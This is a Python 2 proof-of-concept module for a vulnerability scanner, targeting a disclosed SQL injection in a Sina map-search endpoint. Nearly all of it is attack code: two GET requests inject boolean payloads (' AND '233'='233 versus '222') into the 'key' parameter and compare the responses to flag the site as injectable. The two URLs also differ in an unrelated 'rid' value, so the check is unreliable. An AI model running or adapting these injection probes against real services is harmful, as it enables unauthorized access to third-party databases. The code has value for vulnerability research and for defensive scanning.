# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Sina_0133' # 平台漏洞编号
    name = '新浪mapsrch.house接口SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-06-24'  # 漏洞公布时间
    desc = '''模版漏洞描述
    新浪mapsrch.house接口SQL注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=206216
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Sina'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '5c0a2383-4571-4021-8f20-d916d3868027' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/gss/simple?encode=utf-8&srctype=POI&number=10&batch=1&range=3000&resType=json&retvalue=1&key=16a4150d21aaee9be07ce960b867f37003afd183c8306ae139ac98f432932286151dc0ec55580eca' AND '233'='233&sid=1002&cenX=116.314553&cenY=39.820966&keyword=&rid=74248"
            url1 = self.target + "/gss/simple?encode=utf-8&srctype=POI&number=10&batch=1&range=3000&resType=json&retvalue=1&key=16a4150d21aaee9be07ce960b867f37003afd183c8306ae139ac98f432932286151dc0ec55580eca' AND '233'='222&sid=1002&cenX=116.314553&cenY=39.820966&keyword=&rid=7424"
            _response = requests.get(url)
            _response1 = requests.get(url1)
            if _response.text != _response1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
